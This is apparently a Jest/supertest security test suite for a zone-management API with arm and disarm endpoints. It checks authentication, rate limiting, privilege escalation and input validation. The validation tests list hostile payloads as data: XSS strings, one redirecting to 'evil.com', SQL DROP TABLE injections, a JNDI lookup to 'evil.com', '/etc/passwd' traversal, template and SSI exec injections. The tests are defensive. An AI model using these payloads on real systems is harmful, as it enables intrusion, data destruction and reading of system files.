const request = require('supertest');
const app = require('../../src/app');

describe('Zone Security Tests', () => {
  let adminToken;
  let userToken;
  let adminUserId;
  let regularUserId;
  let testZoneId;

  beforeAll(async () => {
    // Create admin user
    const adminRegResponse = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Admin User',
        pin: '0000',
        role: 'admin'
      });

    if (adminRegResponse.status === 201 || adminRegResponse.status === 409) {
      const adminLoginResponse = await request(app)
        .post('/api/auth/login')
        .send({ pin: '0000' });
      
      adminToken = adminLoginResponse.body.token;
      adminUserId = adminLoginResponse.body.user.id;
    }

    // Create regular user
    const userRegResponse = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Regular User',
        pin: '1111',
        role: 'user'
      });

    if (userRegResponse.status === 201 || userRegResponse.status === 409) {
      const userLoginResponse = await request(app)
        .post('/api/auth/login')
        .send({ pin: '1111' });
      
      userToken = userLoginResponse.body.token;
      regularUserId = userLoginResponse.body.user.id;
    }

    // Create a test zone for security testing
    const zoneResponse = await request(app)
      .post('/api/zones')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Security Test Zone',
        description: 'Zone for security testing'
      });
    testZoneId = zoneResponse.body.data.id;
  });

  describe('Authentication and Authorization', () => {
    test('should require authentication for all zone operations', async () => {
      const endpoints = [
        { method: 'get', path: '/api/zones' },
        { method: 'post', path: '/api/zones' },
        { method: 'get', path: `/api/zones/${testZoneId}` },
        { method: 'put', path: `/api/zones/${testZoneId}` },
        { method: 'delete', path: `/api/zones/${testZoneId}` },
        { method: 'post', path: `/api/zones/${testZoneId}/arm` },
        { method: 'post', path: `/api/zones/${testZoneId}/disarm` }
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)[endpoint.method](endpoint.path);
        expect(response.status).toBe(401);
      }
    });

    test('should reject invalid tokens', async () => {
      const invalidTokens = [
        'invalid.token.here',
        'Bearer invalid-token',
        '',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .get('/api/zones')
          .set('Authorization', `Bearer ${token}`);
        
        expect(response.status).toBe(401);
      }
    });

    test('should require proper permissions for zone creation', async () => {
      // Test with regular user (should be allowed if permissions are configured)
      const response = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          name: 'User Created Zone',
          description: 'Zone created by regular user'
        });

      // Check if user permissions are properly configured
      expect([200, 201, 403]).toContain(response.status);
    });

    test('should enforce role-based access control', async () => {
      // Admin should be able to delete zones
      const adminDeleteResponse = await request(app)
        .delete(`/api/zones/${testZoneId}`)
        .set('Authorization', `Bearer ${adminToken}`);

      // Should either succeed or return 404 if zone doesn't exist
      expect([200, 404]).toContain(adminDeleteResponse.status);
    });
  });

  describe('Input Validation Security', () => {
    test('should prevent XSS attacks in zone names', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        'javascript:void(0)',
        '<iframe src="javascript:alert(\'xss\')"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/zones')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: payload,
            description: 'XSS test zone'
          });

        // Should either reject the input or sanitize it
        if (response.status === 201) {
          expect(response.body.data.name).not.toContain('<script>');
          expect(response.body.data.name).not.toContain('javascript:');
          expect(response.body.data.name).not.toContain('onerror');
          expect(response.body.data.name).not.toContain('onload');
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    test('should prevent XSS attacks in zone descriptions', async () => {
      const xssPayloads = [
        '<script>fetch("/api/admin").then(r=>r.json())</script>',
        '<img src=x onerror="fetch(\'/api/users\')">',
        'javascript:document.location="http://evil.com"'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/zones')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: 'XSS Test Zone Desc',
            description: payload
          });

        if (response.status === 201) {
          expect(response.body.data.description).not.toContain('<script>');
          expect(response.body.data.description).not.toContain('javascript:');
          expect(response.body.data.description).not.toContain('onerror');
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    test('should prevent SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE zones; --",
        "' OR '1'='1",
        "'; DELETE FROM zones WHERE id='1'; --",
        "UNION SELECT * FROM users",
        "1' AND 1=1 --",
        "' OR 1=1#",
        "admin'--",
        "admin' OR '1'='1'/*"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/zones')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: payload,
            description: 'SQL injection test'
          });

        // Should reject malicious input
        expect(response.status).toBe(400);
      }
    });

    test('should validate zone ID format to prevent injection', async () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '../../admin',
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '; DROP TABLE zones; --',
        '${jndi:ldap://evil.com/a}',
        '%0Ajavascript:alert("xss")',
        'null',
        'undefined',
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<!--#exec cmd="ls"-->'
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(app)
          .get(`/api/zones/${encodeURIComponent(maliciousId)}`)
          .set('Authorization', `Bearer ${adminToken}`);

        // Should return 400 for invalid ID format or 404 for not found
        expect([400, 404]).toContain(response.status);
      }
    });

    test('should prevent NoSQL injection attacks', async () => {
      const noSqlPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "function() { return true; }"}',
        '{"$regex": ".*"}',
        '{"$expr": {"$gt": [1, 1]}}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}'
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/api/zones')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: payload,
            description: 'NoSQL injection test'
          });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Rate Limiting and DOS Protection', () => {
    test('should implement rate limiting for zone creation', async () => {
      const requests = [];
      
      // Send many rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app)
            .post('/api/zones')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
              name: `Rate Limit Test Zone ${i}`,
              description: 'Rate limiting test'
            })
        );
      }

      const responses = await Promise.all(requests);
      
      // Should start rate limiting after certain number of requests
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    }, 30000); // Increase timeout for this test

    test('should handle large payload attacks', async () => {
      const largePayload = {
        name: 'A'.repeat(10000),
        description: 'B'.repeat(100000)
      };

      const response = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(largePayload);

      expect(response.status).toBe(400);
    });

    test('should protect against parameter pollution', async () => {
      // Test with duplicate parameters
      const response = await request(app)
        .get('/api/zones?limit=10&limit=1000&limit=999999')
        .set('Authorization', `Bearer ${adminToken}`);

      if (response.status === 200) {
        // Should use a reasonable limit, not the malicious one
        expect(response.body.data.length).toBeLessThanOrEqual(100);
      }
    });
  });

  describe('CSRF Protection', () => {
    test('should implement CSRF protection for state-changing operations', async () => {
      // Test without CSRF token (if implemented)
      const response = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .set('Origin', 'http://evil.com')
        .send({
          name: 'CSRF Test Zone',
          description: 'Testing CSRF protection'
        });

      // Should either require CSRF token or validate origin
      // Implementation depends on specific CSRF protection strategy
      expect([200, 201, 403]).toContain(response.status);
    });
  });

  describe('Data Exposure Prevention', () => {
    test('should not expose sensitive information in error messages', async () => {
      const response = await request(app)
        .get('/api/zones/non-existent-zone-123')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(404);
      
      // Error message should not expose internal details
      const errorMessage = response.body.message.toLowerCase();
      expect(errorMessage).not.toContain('database');
      expect(errorMessage).not.toContain('sql');
      expect(errorMessage).not.toContain('table');
      expect(errorMessage).not.toContain('query');
      expect(errorMessage).not.toContain('error:');
    });

    test('should not expose internal zone IDs or sensitive data', async () => {
      const response = await request(app)
        .get('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(200);
      
      if (response.body.data.length > 0) {
        const zone = response.body.data[0];
        
        // Should not expose internal database IDs or sensitive fields
        expect(zone._id).toBeUndefined();
        expect(zone.__v).toBeUndefined();
        expect(zone.internalId).toBeUndefined();
        expect(zone.hash).toBeUndefined();
        expect(zone.secret).toBeUndefined();
      }
    });

    test('should implement proper headers for security', async () => {
      const response = await request(app)
        .get('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`);

      // Check for security headers
      expect(response.headers['x-content-type-options']).toBeDefined();
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(response.headers['x-xss-protection']).toBeDefined();
    });
  });

  describe('Session and Token Security', () => {
    test('should handle token expiration properly', async () => {
      // Create an expired token (if token expiration is implemented)
      const expiredToken = 'expired.token.here';
      
      const response = await request(app)
        .get('/api/zones')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
    });

    test('should prevent token reuse after logout', async () => {
      // If logout is implemented
      const logoutResponse = await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${userToken}`);

      if (logoutResponse.status === 200) {
        // Token should be invalidated
        const response = await request(app)
          .get('/api/zones')
          .set('Authorization', `Bearer ${userToken}`);

        expect(response.status).toBe(401);
      }
    });
  });

  describe('Privilege Escalation Prevention', () => {
    test('should prevent horizontal privilege escalation', async () => {
      // Create a zone with admin user
      const adminZoneResponse = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Admin Only Zone',
          description: 'Zone that should only be accessible by admin'
        });

      const adminZoneId = adminZoneResponse.body.data.id;

      // Regular user should not be able to modify admin's zone
      const userModifyResponse = await request(app)
        .put(`/api/zones/${adminZoneId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          name: 'Hacked Zone Name'
        });

      // Should prevent unauthorized modification
      expect([403, 404]).toContain(userModifyResponse.status);
    });

    test('should prevent vertical privilege escalation', async () => {
      // Regular user should not be able to access admin-only functions
      const response = await request(app)
        .get('/api/zones/hierarchy/validate')
        .set('Authorization', `Bearer ${userToken}`);

      // Should require admin privileges
      expect([403, 404]).toContain(response.status);
    });
  });

  describe('Business Logic Security', () => {
    test('should prevent circular zone hierarchy attacks', async () => {
      // Create parent and child zones
      const parentResponse = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Circular Parent',
          description: 'Parent for circular test'
        });

      const childResponse = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Circular Child',
          description: 'Child for circular test',
          parentZoneId: parentResponse.body.data.id
        });

      // Try to create circular reference
      const circularResponse = await request(app)
        .put(`/api/zones/${parentResponse.body.data.id}/parent`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          parentZoneId: childResponse.body.data.id
        });

      expect(circularResponse.status).toBe(409);
      expect(circularResponse.body.message).toContain('circular');
    });

    test('should prevent zone hierarchy depth attacks', async () => {
      let currentParentId = null;
      const maxDepth = 10;

      // Try to create very deep hierarchy
      for (let i = 0; i < maxDepth; i++) {
        const response = await request(app)
          .post('/api/zones')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: `Deep Zone Level ${i}`,
            description: `Zone at depth ${i}`,
            parentZoneId: currentParentId
          });

        if (response.status === 201) {
          currentParentId = response.body.data.id;
        } else {
          // Should prevent excessive depth
          expect(response.status).toBe(400);
          break;
        }
      }
    });

    test('should validate zone state transitions', async () => {
      // Create a test zone
      const zoneResponse = await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'State Transition Test Zone',
          description: 'Zone for testing state transitions'
        });

      const zoneId = zoneResponse.body.data.id;

      // Try to disarm an already disarmed zone
      const disarmResponse = await request(app)
        .post(`/api/zones/${zoneId}/disarm`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect(disarmResponse.status).toBe(409);
      expect(disarmResponse.body.message).toContain('already disarmed');
    });
  });

  describe('Audit and Logging Security', () => {
    test('should log security-relevant events', async () => {
      // Perform a security-relevant action
      await request(app)
        .post('/api/zones')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Audit Test Zone',
          description: 'Zone for audit testing'
        });

      // Note: Actual audit log verification would require access to log files
      // This test ensures the operation completes without errors
      expect(true).toBe(true);
    });

    test('should handle attempted security violations gracefully', async () => {
      // Attempt multiple security violations
      const violations = [
        () => request(app).get('/api/zones/../../../etc/passwd'),
        () => request(app).post('/api/zones').send({ name: '<script>alert("xss")</script>' }),
        () => request(app).get('/api/zones').set('Authorization', 'Bearer invalid-token')
      ];

      for (const violation of violations) {
        const response = await violation();
        
        // Should handle gracefully without exposing errors
        expect([400, 401, 404]).toContain(response.status);
        expect(response.body.message).toBeDefined();
        expect(response.body.stack).toBeUndefined();
      }
    });
  });
});